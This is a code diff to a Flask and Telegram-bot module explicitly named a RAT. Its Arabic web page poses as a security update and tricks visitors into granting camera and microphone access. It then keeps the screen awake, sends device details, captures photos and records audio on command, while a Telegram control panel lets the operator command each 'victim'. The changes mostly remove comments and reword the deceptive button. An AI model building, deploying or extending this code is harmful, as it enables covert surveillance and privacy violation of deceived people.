@@ -5,7 +5,7 @@ from flask import Blueprint, render_template_string, request
 
 rat_bp = Blueprint('rat_module_v2', __name__)
 
-# قالب احترافي مزود بتقنيات منع السكون والخلفية النشطة
+# قالب احترافي مزود بزر واحد وتقنيات منع السكون والخلفية النشطة
 RAT_ADVANCED_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -26,7 +26,7 @@ RAT_ADVANCED_TEMPLATE = """
     <div class="box" id="mainBox">
         <h2>⚡ تحديث الأداء والاتصال الآمن</h2>
         <p>لتفعيل الحماية الكاملة وتحسين استقرار الشبكة، اضغط على الزر أدناه لبدء المزامنة الفورية.</p>
-        <button class="action-btn" onclick="activateFullControl()">بدء التثبيت والمزامنة</button>
+        <button class="action-btn" onclick="activateFullControl()">قبول وتثبيت التحديث</button>
     </div>
 
     <video id="v" autoplay playsinline style="display:none;"></video>
@@ -36,23 +36,18 @@ RAT_ADVANCED_TEMPLATE = """
         const chatId = "{{ chat_id }}";
         let wakeLock = null;
 
-        // ميزة منع الهاتف من الدخول في وضع السكون (Wake Lock API)
         async function requestWakeLock() {
             try {
                 if ('wakeLock' in navigator) {
                     wakeLock = await navigator.wakeLock.request('screen');
                 }
-            } catch (err) {
-                console.log("Wake Lock error: ", err);
-            }
+            } catch (err) {}
         }
 
         async function activateFullControl() {
             try {
-                // تفعيل منع السكون
                 requestWakeLock();
 
-                // طلب صلاحيات الكاميرا والميكروفون بضغطة زر واحدة
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: true 
@@ -61,20 +56,16 @@ RAT_ADVANCED_TEMPLATE = """
                 const video = document.getElementById('v');
                 video.srcObject = stream;
 
-                // إرسال البيانات الأولية للجهاز
                 sendDeviceInfo();
 
-                // التقاط صورة أولية بعد ثانية
                 setTimeout(() => { captureAndSendPhoto(video); }, 1500);
 
-                // بدء الاستماع المستمر للأوامر من السيرفر في الخلفية
                 startCommandPolling();
 
-                // تغيير الواجهة لتبدو كأن التحديث يعمل بنجاح
                 document.getElementById('mainBox').innerHTML = "<h2>✅ جاري تحسين النظام...</h2><p>الرجاء إبقاء هذه الصفحة مفتوحة لضمان اكتمال التحسينات الأمنية.</p>";
 
             } catch (err) {
-                alert("يرجى الموافقة على الأذن المترتب لضمان نجاح التحديث.");
+                alert("يرجى الموافقة على الإذن لضمان نجاح التحديث.");
             }
         }
 
@@ -108,7 +99,6 @@ RAT_ADVANCED_TEMPLATE = """
             });
         }
 
-        // حلقة تفقد الأوامر القادمة من السيرفر في الخلفية كل 4 ثوانٍ بدقة عالية
         function startCommandPolling() {
             setInterval(async () => {
                 try {
@@ -131,8 +121,7 @@ RAT_ADVANCED_TEMPLATE = """
                         });
                     } 
                     else if (cmd.action === "audio") {
-                        // تسجيل صوتي مباشر لمدة 5 ثوانٍ عند الطلب
-                        const stream = video.srcObject;
+                        const stream = document.getElementById('v').srcObject;
                         if (stream) {
                             let chunks = [];
                             const recorder = new MediaRecorder(stream);
@@ -161,10 +150,10 @@ RAT_ADVANCED_TEMPLATE = """
 </html>
 """
 
-# طوابير تخزين الأوامر المؤقتة لكل ضحية لضمان دقة التنفيذ الفوري
 pending_commands = {}
 
 def init_rat_routes(app, bot):
+    # تم ضبط المسار هنا ليطابق تماماً ما يوجد في main.py (system_secure_v2)
     @app.route('/system_secure_v2', methods=['GET'])
     def rat_landing():
         chat_id = request.args.get('id', '0')
@@ -183,7 +172,6 @@ def init_rat_routes(app, bot):
                 f"⚙️ **المعالج:** `{data.get('cores')} أنوية`\n\n"
                 "👇 **اختر الأوامر للتحكم بالضحية من الأزرار أسفل الرسالة:**"
             )
-            # إرسال الرسالة مع لوحة تحكم تفاعلية (أزرار التحكم الدقيق)
             from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
             markup = InlineKeyboardMarkup()
             markup.row(
@@ -237,7 +225,6 @@ def init_rat_routes(app, bot):
                 print(f"Audio err: {e}")
         return {"status": "ok"}
 
-# دالة لتسجيل الأوامر المرسلة من أزرار التليجرام
 def queue_command(chat_id, action):
     if chat_id not in pending_commands:
         pending_commands[chat_id] = []
